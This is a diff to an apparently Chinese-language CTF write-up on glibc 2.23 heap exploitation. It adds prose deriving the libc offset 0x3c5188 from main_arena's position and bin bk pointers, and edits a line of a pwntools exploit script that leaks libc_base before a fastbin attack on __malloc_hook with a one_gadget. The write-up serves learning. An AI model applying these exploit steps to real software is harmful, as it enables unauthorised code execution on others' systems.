@@ -133,7 +133,8 @@ main_arena与malloc_hook的地址差为0x10，而malloc_hook的值可以用pwnto
 main_arena_offset = ELF("libc-2.23.so").symbols["__malloc_hook"] + 0x10
 ```
 
-利用这两种方法之一，便可以算出main_arena在libc中的偏移了，再获取bk和main_arena的偏移，即可计算libc_base
+利用这两种方法之一，便可以算出main_arena在libc中的偏移了，得出偏移为0x3C4B20
+再获取bk和main_arena的偏移，即可计算libc_base
 
 #### 计算bk与main_arena的偏移
 可以直接调试获取
@@ -345,6 +346,9 @@ print(offset) #1640
 最后减去`word_bytes * 2`是因为bins的bk指针指向的是`&bins[(i-1)*2]-0x10`，所以要减去`word_bytes * 2`即0x10
 最终计算结果与调试结果一致
 
+bk在main_arena的偏移为1640，main_arena在libc的偏移为0x3C4B20
+所以最终偏移为`1640+0x3C4B20=0x3c5188`
+
 #### 分配到malloc_hook
 因为程序在free堆块之后没有清空，可以继续写值，那我们就可以修改这个堆块的fd指针指向一个addr
 之后申请该大小的堆块之后，对应大小的fastbin指针就会指向fd指针，即addr
@@ -523,7 +527,7 @@ add(0x1000,b'aaaa')
 add(0x10,b'bbbbbbbb')
 show()
 p.recvuntil(b'bbbbbbbb')
-libc_base = u64(p.recv(6).ljust(8,b'\x00'))-0x3c5188
+libc_base = u64(p.recv(6).ljust(8,b'\x00'))-(1640+0x3C4B20)
 print(hex(libc_base))
 
 # 计算 malloc_hook 和 one_gadget 的地址
